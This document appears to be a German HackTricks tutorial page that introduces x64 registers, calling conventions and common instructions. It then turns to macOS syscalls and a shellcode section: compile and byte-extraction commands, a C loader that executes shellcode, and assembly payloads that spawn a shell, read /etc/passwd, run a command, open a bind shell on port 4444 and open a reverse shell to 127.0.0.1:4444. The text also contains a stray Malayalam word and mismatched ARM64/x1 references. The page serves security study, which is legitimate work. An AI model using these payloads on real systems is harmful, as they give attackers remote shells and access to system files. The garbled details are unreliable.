# Einführung in x64

{{#include ../../../banners/hacktricks-training.md}}

## **Einführung in x64**

x64, auch als x86-64 bekannt, ist eine 64-Bit-Prozessorarchitektur, die überwiegend im Desktop- und Server-Computing eingesetzt wird. Sie entstand aus der von Intel entwickelten x86-Architektur und wurde später von AMD unter dem Namen AMD64 übernommen. Heute ist sie die vorherrschende Architektur in Personal Computern und Servern.

### **Register**

x64 erweitert die x86-Architektur und verfügt über **16 Universalregister** mit den Bezeichnungen `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` und `r8` bis `r15`. Jedes dieser Register kann einen **64-Bit**-Wert (8 Byte) speichern. Diese Register verfügen außerdem über 32-Bit-, 16-Bit- und 8-Bit-Teilregister für Kompatibilität und spezielle Aufgaben.

1. **`rax`** - Traditionell für **Rückgabewerte** von Funktionen verwendet.
2. **`rbx`** - Häufig als **Basisregister** für Speicheroperationen verwendet.
3. **`rcx`** - Üblicherweise für **Schleifenzähler** verwendet.
4. **`rdx`** - Wird in verschiedenen Rollen verwendet, unter anderem für erweiterte arithmetische Operationen.
5. **`rbp`** - **Basispointer** für den Stack-Frame.
6. **`rsp`** - **Stack-Pointer**, der die Spitze des Stacks verfolgt.
7. **`rsi`** und **`rdi`** - Für **Quell-** und **Zielindizes** bei String-/Speicheroperationen verwendet.
8. **`r8`** bis **`r15`** - Zusätzliche Universalregister, die in x64 eingeführt wurden.

### **Aufrufkonvention**

Die x64-Aufrufkonvention unterscheidet sich je nach Betriebssystem. Zum Beispiel:

- **Windows**: Die ersten **vier Parameter** werden in den Registern **`rcx`**, **`rdx`**, **`r8`** und **`r9`** übergeben. Weitere Parameter werden auf den Stack gelegt. Der Rückgabewert befindet sich in **`rax`**.
- **System V (häufig in UNIX-ähnlichen Systemen verwendet)**: Die ersten **sechs Integer- oder Pointer-Parameter** werden in den Registern **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** und **`r9`** übergeben. Der Rückgabewert befindet sich ebenfalls in **`rax`**.

Wenn die Funktion mehr als sechs Eingaben besitzt, wird der **Rest auf dem Stack übergeben**. **RSP**, der Stack-Pointer, muss an **16 Byte ausgerichtet** sein. Das bedeutet, dass die Adresse, auf die er zeigt, vor jedem Aufruf durch 16 teilbar sein muss. Normalerweise müssten wir daher sicherstellen, dass RSP in unserem Shellcode korrekt ausgerichtet ist, bevor wir einen Funktionsaufruf durchführen. In der Praxis funktionieren Systemaufrufe jedoch häufig auch dann, wenn diese Anforderung nicht erfüllt ist.

### Aufrufkonvention in Swift

Swift verfügt über eine eigene **Aufrufkonvention**, die unter [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) zu finden ist.

### **Häufige Befehle**

x64-Befehle verfügen über einen umfangreichen Befehlssatz, der die Kompatibilität mit früheren x86-Befehlen aufrechterhält und neue Befehle einführt.

- **`mov`**: Verschiebt einen Wert von einem **Register** oder **Speicherort** in einen anderen.
- Beispiel: `mov rax, rbx` — Verschiebt den Wert aus `rbx` nach `rax`.
- **`push`** und **`pop`**: Legen Werte auf den **Stack** oder entfernen sie von dort.
- Beispiel: `push rax` — Legt den Wert in `rax` auf dem Stack ab.
- Beispiel: `pop rax` — Nimmt den obersten Wert vom Stack und legt ihn in `rax` ab.
- **`add`** und **`sub`**: Operationen für **Addition** und **Subtraktion**.
- Beispiel: `add rax, rcx` — Addiert die Werte in `rax` und `rcx` und speichert das Ergebnis in `rax`.
- **`mul`** und **`div`**: Operationen für **Multiplikation** und **Division**. Hinweis: Diese weisen ein bestimmtes Verhalten bezüglich der Verwendung von Operanden auf.
- **`call`** und **`ret`**: Werden zum **Aufrufen** und **Zurückkehren aus Funktionen** verwendet.
- **`int`**: Wird ausgelöst, um einen Software-**Interrupt** auszuführen. Zum Beispiel wurde `int 0x80` für Systemaufrufe in 32-Bit-x86-Linux verwendet.
- **`cmp`**: Vergleicht zwei Werte und setzt die CPU-Flags anhand des Ergebnisses.
- Beispiel: `cmp rax, rdx` — Vergleicht `rax` mit `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Befehle für **bedingte Sprünge**, die den Kontrollfluss anhand der Ergebnisse eines vorherigen `cmp`- oder Testbefehls ändern.
- Beispiel: Nach einem `cmp rax, rdx`-Befehl springt `je label` zu `label`, wenn `rax` gleich `rdx` ist.
- **`syscall`**: Wird für **Systemaufrufe** in einigen x64-Systemen verwendet, etwa in modernen Unix-Systemen.
- **`sysenter`**: Ein optimierter **Systemaufruf**-Befehl auf einigen Plattformen.

### **Funktionsprolog**

1. **Den alten Basispointer auf den Stack legen**: `push rbp` (speichert den Basispointer des Aufrufers)
2. **Den aktuellen Stack-Pointer in den Basispointer verschieben**: `mov rbp, rsp` (richtet den neuen Basispointer für die aktuelle Funktion ein)
3. **Platz für lokale Variablen auf dem Stack reservieren**: `sub rsp, <size>` (wobei `<size>` der benötigten Anzahl an Bytes entspricht)

### **Funktions-Epilog**

1. **Den aktuellen Basispointer in den Stack-Pointer verschieben**: `mov rsp, rbp` (gibt lokale Variablen frei)
2. **Den alten Basispointer vom Stack nehmen**: `pop rbp` (stellt den Basispointer des Aufrufers wieder her)
3. **Zurückkehren**: `ret` (gibt die Kontrolle an den Aufrufer zurück)

## macOS

### syscalls

Es gibt verschiedene Klassen von syscalls, die Sie [**hier finden können**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Dann können Sie jede Syscall-Nummer [**unter dieser URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** കണ്ടെത്ത
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Um den `open`-Syscall (**5**) aus der **Unix/BSD class** aufzurufen, musst du Folgendes hinzufügen: `0x2000000`

Die aufzurufende Syscall-Nummer für open wäre also `0x2000005`

### Shellcodes

Zum Kompilieren:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Zum Extrahieren der Bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>C-Code zum Testen des Shellcodes</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Entnommen von [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) und erklärt.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Mit cat lesen

Das Ziel besteht darin, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen. Daher ist das zweite Argument (x1) ein Array von Parametern (im Speicher entspricht dies einem Stack mit den Adressen).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Befehl mit sh ausführen
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell von [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) auf **port 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell von [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell zu **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Referenzen

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
